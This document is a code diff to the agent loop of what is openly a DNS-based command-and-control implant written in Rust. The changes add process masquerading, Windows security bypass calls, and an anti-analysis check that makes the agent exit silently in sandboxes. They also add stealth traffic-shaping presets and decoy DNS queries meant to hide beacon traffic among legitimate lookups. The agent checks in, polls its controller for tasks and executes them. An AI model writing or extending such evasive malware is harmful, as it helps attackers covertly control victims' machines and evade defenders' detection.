@@ -1,8 +1,48 @@
+pub mod selfupdate;
+
 use crate::c2::{self, C2Error, SessionInfo, Task, TaskResponse, TaskStatus};
 use crate::crypto::EncryptionKey;
 use crate::dns::DnsBackend;
+use crate::evasion;
+use crate::traffic::shaping::{self, TrafficProfile};
 use log::{error, info, warn};
-use rand::Rng;
+
+/// Traffic profile presets exposed to CLI
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum ProfilePreset {
+    /// Low latency, higher detection risk
+    Aggressive,
+    /// Balanced — default
+    Default,
+    /// High latency, blends with business traffic
+    Stealthy,
+    /// Extremely slow, minimal footprint
+    Paranoid,
+}
+
+impl std::str::FromStr for ProfilePreset {
+    type Err = String;
+    fn from_str(s: &str) -> Result<Self, Self::Err> {
+        match s.to_lowercase().as_str() {
+            "aggressive" => Ok(ProfilePreset::Aggressive),
+            "default" | "normal" => Ok(ProfilePreset::Default),
+            "stealthy" | "stealth" => Ok(ProfilePreset::Stealthy),
+            "paranoid" => Ok(ProfilePreset::Paranoid),
+            _ => Err(format!("unknown profile: {s} (try: aggressive, default, stealthy, paranoid)")),
+        }
+    }
+}
+
+impl ProfilePreset {
+    pub fn to_traffic_profile(self) -> TrafficProfile {
+        match self {
+            ProfilePreset::Aggressive => TrafficProfile::aggressive(),
+            ProfilePreset::Default => TrafficProfile::default(),
+            ProfilePreset::Stealthy => TrafficProfile::stealthy(),
+            ProfilePreset::Paranoid => TrafficProfile::paranoid(),
+        }
+    }
+}
 
 /// Jitter strategy for beacon timing.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -10,7 +50,6 @@ pub enum JitterStrategy {
     /// Linear jitter: base +/- (base * pct). Default.
     Linear,
     /// Exponential jitter: base * 2^random(0, pct).
-    /// Produces longer tail of sleep times, harder to profile.
     Exponential,
     /// Adaptive jitter: shorter during business hours (09-17),
     /// longer and more random during off-hours.
@@ -51,25 +90,40 @@ pub struct AgentConfig {
     pub key: EncryptionKey,
     pub session_id: String,
     pub poll_interval_secs: u64,
-    pub jitter_pct: f64, // 0.0 - 1.0
+    pub jitter_pct: f64,
     pub jitter_strategy: JitterStrategy,
+    /// Anti-analysis confidence threshold (0.0 = disabled, 0.3 = moderate, 0.7 = strict)
+    pub paranoia: f64,
+    /// Traffic shaping profile
+    pub traffic_profile: TrafficProfile,
+    /// Enable polymorphic encoding on C2 payloads
+    pub encode_c2: bool,
 }
 
 pub async fn run(
     backend: &dyn DnsBackend,
     config: &AgentConfig,
 ) -> Result<(), C2Error> {
-    // Apply evasion on startup
+    // ─── Process masquerade + evasion on startup ───
+    evasion::masquerade::masquerade();
     #[cfg(target_os = "windows")]
     {
         crate::evasion::runtime::windows::apply_all_bypasses();
     }
-    #[cfg(target_os = "linux")]
-    {
-        crate::evasion::runtime::linux::mask_process_name("[kworker/0:1-events]");
+
+    // ─── Anti-analysis gate ───
+    if config.paranoia > 0.0 {
+        let report = evasion::anti_analysis::run_all_checks();
+        if report.confidence >= config.paranoia {
+            info!("environment check failed (confidence={:.0}%), exiting silently",
+                report.confidence * 100.0);
+            return Ok(());
+        }
+        info!("environment check passed (confidence={:.0}%, threshold={:.0}%)",
+            report.confidence * 100.0, config.paranoia * 100.0);
     }
 
-    // Check in
+    // ─── Check in ───
     let info = SessionInfo {
         session_id: config.session_id.clone(),
         hostname: get_hostname(),
@@ -84,9 +138,7 @@ pub async fn run(
     c2::check_in(backend, &config.domain, &config.key, &info).await?;
     info!("checked in: session={}", config.session_id);
 
-    let mut burst_counter: u32 = 0;
-
-    // Main loop
+    // ─── Main loop ───
     loop {
         match c2::poll_task(backend, &config.domain, &config.key, &config.session_id).await {
             Ok(Some(task)) => {
@@ -135,74 +187,67 @@ pub async fn run(
             }
         }
 
-        // Sleep with jitter
-        let sleep_secs = apply_jitter(
-            config.poll_interval_secs,
-            config.jitter_pct,
-            config.jitter_strategy,
-            &mut burst_counter,
-        );
-        tokio::time::sleep(tokio::time::Duration::from_secs(sleep_secs)).await;
+        // ─── Fire decoy DNS queries ───
+        let decoys = config.traffic_profile.generate_decoy_schedule();
+        if !decoys.is_empty() {
+            tokio::spawn(async move {
+                fire_decoy_queries(decoys).await;
+            });
+        }
+
+        // ─── Obfuscated sleep with traffic shaping ───
+        let sleep_duration = config.traffic_profile.next_sleep_duration();
+        info!("sleeping {:.1}s", sleep_duration.as_secs_f64());
+
+        let sleep_dur = sleep_duration;
+        tokio::task::spawn_blocking(move || {
+            std::thread::sleep(sleep_dur);
+        }).await.unwrap_or_else(|e| {
+            warn!("sleep task failed: {e}");
+        });
     }
 
     Ok(())
 }
 
-/// Apply jitter strategy to compute sleep duration.
-fn apply_jitter(base_secs: u64, jitter_pct: f64, strategy: JitterStrategy, burst_counter: &mut u32) -> u64 {
-    let mut rng = rand::thread_rng();
-    let base = base_secs as f64;
+/// Fire decoy DNS queries to blend C2 traffic with legitimate lookups.
+async fn fire_decoy_queries(schedule: Vec<(u64, String)>) {
+    use std::net::UdpSocket;
 
-    let sleep = match strategy {
-        JitterStrategy::Linear => {
-            let jitter = base * jitter_pct;
-            if jitter > 0.0 {
-                base + rng.gen_range(-jitter..jitter)
-            } else {
-                base
-            }
+    for (delay_ms, domain) in schedule {
+        if delay_ms > 0 {
+            tokio::time::sleep(tokio::time::Duration::from_millis(delay_ms)).await;
         }
-        JitterStrategy::Exponential => {
-            let exp = rng.gen_range(0.0..jitter_pct.max(0.01));
-            base * 2.0_f64.powf(exp)
-        }
-        JitterStrategy::Adaptive => {
-            // Use hour-of-day to vary behavior
-            let epoch_secs = std::time::SystemTime::now()
-                .duration_since(std::time::UNIX_EPOCH)
-                .unwrap()
-                .as_secs();
-            let hour = ((epoch_secs % 86400) / 3600) as u32; // UTC hour
 
-            if (9..17).contains(&hour) {
-                // Business hours: shorter intervals, small jitter
-                let jitter = base * 0.2;
-                base + rng.gen_range(-jitter..jitter)
-            } else {
-                // Off-hours: longer intervals, more random
-                let multiplier = rng.gen_range(1.5..4.0);
-                base * multiplier + rng.gen_range(0.0..60.0)
+        let domain_clone = domain.clone();
+        tokio::task::spawn_blocking(move || {
+            if let Ok(sock) = UdpSocket::bind("0.0.0.0:0") {
+                sock.set_read_timeout(Some(std::time::Duration::from_secs(2))).ok();
+                let pkt = build_simple_dns_query(&domain_clone);
+                let _ = sock.send_to(&pkt, "127.0.0.53:53")
+                    .or_else(|_| sock.send_to(&pkt, "8.8.8.8:53"));
+                let mut buf = [0u8; 512];
+                let _ = sock.recv(&mut buf);
             }
-        }
-        JitterStrategy::Bursty => {
-            // 20% chance of burst mode (rapid check-ins)
-            if *burst_counter > 0 {
-                *burst_counter -= 1;
-                // Rapid: 1-3 seconds
-                rng.gen_range(1.0..3.0)
-            } else if rng.gen_range(0.0..1.0) < 0.2 {
-                // Enter burst mode: 3-5 rapid polls
-                *burst_counter = rng.gen_range(3..6);
-                rng.gen_range(1.0..3.0)
-            } else {
-                // Normal with extended quiet period after bursts
-                let jitter = base * jitter_pct;
-                base * 1.5 + rng.gen_range(-jitter..jitter)
-            }
-        }
-    };
+        });
+    }
+}
 
-    sleep.max(1.0) as u64
+/// Build a minimal DNS A query packet for decoy queries.
+fn build_simple_dns_query(name: &str) -> Vec<u8> {
+    let txid: u16 = rand::random();
+    let mut pkt = Vec::with_capacity(64);
+    pkt.extend_from_slice(&txid.to_be_bytes());
+    pkt.extend_from_slice(&[0x01, 0x00]); // flags: standard query, RD
+    pkt.extend_from_slice(&[0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
+    for label in name.split('.') {
+        let len = label.len().min(63); // DNS label max is 63 bytes
+        pkt.push(len as u8);
+        pkt.extend_from_slice(&label.as_bytes()[..len]);
+    }
+    pkt.push(0); // root
+    pkt.extend_from_slice(&[0x00, 0x01, 0x00, 0x01]); // A record, IN class
+    pkt
 }
 
 fn execute(task: &Task) -> TaskResponse {
@@ -236,7 +281,6 @@ fn execute(task: &Task) -> TaskResponse {
 // ─── Cross-platform system info helpers ───
 
 fn get_hostname() -> String {
-    // Try platform-independent approaches first
     #[cfg(target_os = "windows")]
     {
         std::env::var("COMPUTERNAME")
@@ -266,7 +310,6 @@ fn get_username() -> String {
 fn get_os() -> String {
     #[cfg(target_os = "windows")]
     {
-        // Use WMIC or systeminfo for Windows version
         std::process::Command::new("cmd")
             .args(["/c", "ver"])
             .output()
